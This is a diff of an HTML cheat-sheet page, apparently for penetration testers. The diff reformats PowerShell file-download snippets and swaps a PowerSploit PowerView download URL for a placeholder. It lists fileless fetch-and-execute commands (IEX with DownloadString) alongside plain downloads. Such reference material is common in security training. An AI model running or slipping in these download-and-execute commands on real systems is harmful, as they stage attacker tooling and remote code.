@@ -13,35 +13,42 @@
   <details>
     <summary><strong>PowerShell DownloadFile Method</strong></summary>
     <p><strong>Sync</strong></p>
-    <pre><code class="language-powershell">
-(New-Object Net.WebClient).DownloadFile('&lt;FILE URL&gt;','&lt;OUTPUT FILE NAME&gt;')
-    </code></pre>
-
-  <p><strong>Async</strong></p>
-  <pre><code class="language-powershell">
-(New-Object Net.WebClient).DownloadFileAsync('&lt;FILE URL&gt;','&lt;OUTPUT FILE NAME&gt;')
-    </code></pre>
+    <pre>
+      <code class="language-powershell">
+        (New-Object Net.WebClient).DownloadFile('&lt;FILE URL&gt;','&lt;OUTPUT FILE NAME&gt;')
+      </code>
+    </pre>
+    <p><strong>Async</strong></p>
+    <pre>
+      <code class="language-powershell">
+          (New-Object Net.WebClient).DownloadFileAsync('&lt;FILE URL&gt;','&lt;OUTPUT FILE NAME&gt;')
+      </code>
+    </pre>
   </details>
 
   <details>
     <summary><strong>PowerShell DownloadString - Fileless Method</strong></summary>
     <p><strong>Base</strong></p>
-    <pre><code class="language-powershell">
-IEX (New-Object Net.WebClient).DownloadString('&lt;FILE URL&gt;')
-    </code></pre>
-
-  <p><strong>Pipeline input</strong></p>
-  <pre><code class="language-powershell">
-(New-Object Net.WebClient).DownloadString('&lt;FILE URL&gt;') | IEX
-    </code></pre>
-  </details>
-//
+    <pre>
+      <code class="language-powershell">
+        IEX (New-Object Net.WebClient).DownloadString('&lt;FILE URL&gt;')
+      </code>
+    </pre>
+    <p><strong>Pipeline input</strong></p>
+    <pre>
+      <code class="language-powershell">
+        (New-Object Net.WebClient).DownloadString('&lt;FILE URL&gt;') | IEX
+      </code>
+    </pre>
+    </details>
   <details>
     <summary><strong>PowerShell Invoke-WebRequest</strong></summary>
     <p><strong>Base</strong></p>
-    <pre><code class="language-powershell">
-Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-    </code></pre>
+    <pre>
+      <code class="language-powershell">
+        Invoke-WebRequest &lt;FILE URL&gt; -OutFile &lt;OUTPUT FILE NAME&gt;
+      </code>
+    </pre>
   </details>
 
   <hr/>
